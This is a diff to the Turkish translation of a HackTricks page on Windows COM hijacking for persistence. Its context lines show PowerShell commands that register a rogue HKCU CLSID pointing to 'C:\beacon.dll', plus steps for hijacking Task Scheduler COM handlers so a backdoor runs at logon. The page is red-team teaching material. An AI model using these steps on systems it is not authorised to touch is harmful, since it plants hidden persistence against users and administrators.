@@ -15,21 +15,21 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-### Olmayan COM bileşenlerini arama
+### Mevcut Olmayan COM Bileşenlerini Arama
 
-HKCU'nun değerleri kullanıcılar tarafından değiştirilebildiğinden, **COM Hijacking** **kalıcı mekanizmalar** olarak kullanılabilir. `procmon` kullanarak, bir saldırganın kalıcı hale getirmek için oluşturabileceği mevcut olmayan COM kayıtlarını bulmak kolaydır. Filtreler:
+HKCU'nun değerleri kullanıcılar tarafından değiştirilebildiğinden **COM Hijacking** **kalıcı mekanizmalar** olarak kullanılabilir. `procmon` kullanarak, bir saldırganın kalıcılık sağlamak için oluşturabileceği mevcut olmayan COM kayıtlarını bulmak kolaydır. Filtreler:
 
 * **RegOpenKey** işlemleri.
-* _Sonuç_ **NAME NOT FOUND** olduğunda.
-* ve _Yol_ **InprocServer32** ile bitiyorsa.
+* _Sonuç_ **NAME NOT FOUND** olan yerler.
+* ve _Yol_ **InprocServer32** ile bitiyor.
 
-Hangi mevcut olmayan COM'u taklit etmeye karar verdikten sonra, aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun, çünkü bu aşırıya kaçabilir._
+Hangi mevcut olmayan COM'u taklit etmeye karar verdikten sonra aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun, çünkü bu aşırıya kaçabilir._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Ele Geçirilebilir Görev Zamanlayıcı COM bileşenleri
+### Ele Geçirilebilen Görev Zamanlayıcı COM bileşenleri
 
 Windows Görevleri, COM nesnelerini çağırmak için Özel Tetikleyiciler kullanır ve Görev Zamanlayıcı aracılığıyla çalıştırıldıkları için, ne zaman tetikleneceklerini tahmin etmek daha kolaydır.
 
@@ -62,7 +62,7 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [öncekine benzer daha fazla...]</code></pre>
 
-Çıktıyı kontrol ederek, örneğin **her kullanıcı oturum açtığında** çalıştırılacak birini seçebilirsiniz.
+Çıktıyı kontrol ederek, örneğin **her kullanıcı giriş yaptığında** çalıştırılacak birini seçebilirsiniz.
 
 Şimdi **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** ve HKLM ile HKCU'da **{1936ED8A-BD93-3213-E325-F38D112938EF}** CLSID'sini aradığınızda, genellikle değerin HKCU'da mevcut olmadığını bulursunuz.
 ```bash
@@ -85,7 +85,7 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Sonra, HKCU girişini oluşturabilirsiniz ve kullanıcı her giriş yaptığında, arka kapınız çalıştırılacaktır.
+Sonra, HKCU girişini oluşturabilirsiniz ve kullanıcı her giriş yaptığında, arka kapınız çalışacaktır.
 
 {% hint style="success" %}
 AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -96,7 +96,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** bizi **takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
